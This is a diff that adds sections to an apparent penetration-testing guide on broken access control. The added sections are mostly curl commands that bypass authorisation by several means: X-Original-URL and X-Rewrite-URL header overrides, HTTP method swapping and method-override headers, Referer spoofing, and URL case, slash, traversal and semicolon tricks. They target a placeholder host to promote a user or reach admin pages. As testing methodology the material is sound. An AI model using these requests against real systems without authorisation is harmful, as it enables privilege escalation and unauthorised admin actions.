@@ -113,6 +113,77 @@ mutation Promote($id:ID!){
 
 - Cached authorization decisions at edge leading to cross-user reuse; test with Vary and session swaps
 
+### X-Original-URL / X-Rewrite-URL Bypass (Practitioner Critical)
+
+Front-end path-based restrictions can be bypassed when the backend honors override headers:
+
+```bash
+# Front-end blocks /admin but backend reads X-Original-URL
+curl -sk "https://TARGET/" -H "X-Original-URL: /admin" -H "Cookie: session=$SESSION"
+curl -sk "https://TARGET/?username=carlos" -H "X-Original-URL: /admin/delete" -H "Cookie: session=$SESSION"
+
+# X-Rewrite-URL variant (IIS/Apache)
+curl -sk "https://TARGET/" -H "X-Rewrite-URL: /admin/panel" -H "Cookie: session=$SESSION"
+
+# URL path override via request line
+# GET / HTTP/1.1 with X-Original-URL: /admin → bypasses URL-based ACL
+```
+
+### Method-Based Access Control Bypass (Practitioner Critical)
+
+Admin action restricted to POST but accessible via other HTTP methods:
+
+```bash
+# Original admin action (POST restricted to admin)
+curl -sk "https://TARGET/admin-roles" -X POST \
+  -d "username=wiener&action=upgrade" -H "Cookie: session=$USER_SESSION"
+# → 403 Forbidden
+
+# Try alternative methods
+curl -sk "https://TARGET/admin-roles?username=wiener&action=upgrade" -X GET \
+  -H "Cookie: session=$USER_SESSION"
+# → 200 OK (method not checked!)
+
+# Try POSTX, HEAD, OPTIONS
+curl -sk "https://TARGET/admin-roles" -X POSTX \
+  -d "username=wiener&action=upgrade" -H "Cookie: session=$USER_SESSION"
+
+# Method override
+curl -sk "https://TARGET/admin-roles" -X POST \
+  -H "X-HTTP-Method-Override: GET" \
+  -d "username=wiener&action=upgrade" -H "Cookie: session=$USER_SESSION"
+```
+
+### Referer-Based Access Control Bypass (Practitioner Critical)
+
+Some admin sub-pages only check if the Referer header contains the admin URL:
+
+```bash
+# Admin panel at /admin → requires admin role ✓
+# Admin sub-pages check Referer instead of session role
+curl -sk "https://TARGET/admin-roles?username=wiener&action=upgrade" \
+  -H "Referer: https://TARGET/admin" \
+  -H "Cookie: session=$NON_ADMIN_SESSION"
+# If the server checks Referer: /admin instead of actual role → bypass
+```
+
+### URL Matching Inconsistencies
+
+```bash
+# Case sensitivity bypass
+curl -sk "https://TARGET/ADMIN" -H "Cookie: session=$SESSION"
+curl -sk "https://TARGET/Admin" -H "Cookie: session=$SESSION"
+
+# Trailing slash
+curl -sk "https://TARGET/admin/" -H "Cookie: session=$SESSION"
+
+# Path traversal in URL
+curl -sk "https://TARGET/public/../admin" -H "Cookie: session=$SESSION"
+
+# Semicolon path parameter
+curl -sk "https://TARGET/admin;.css" -H "Cookie: session=$SESSION"
+```
+
 ## Testing Methodology
 
 1. **Build Actor × Action matrix** - Unauth, basic, premium, staff/admin; enumerate actions per role
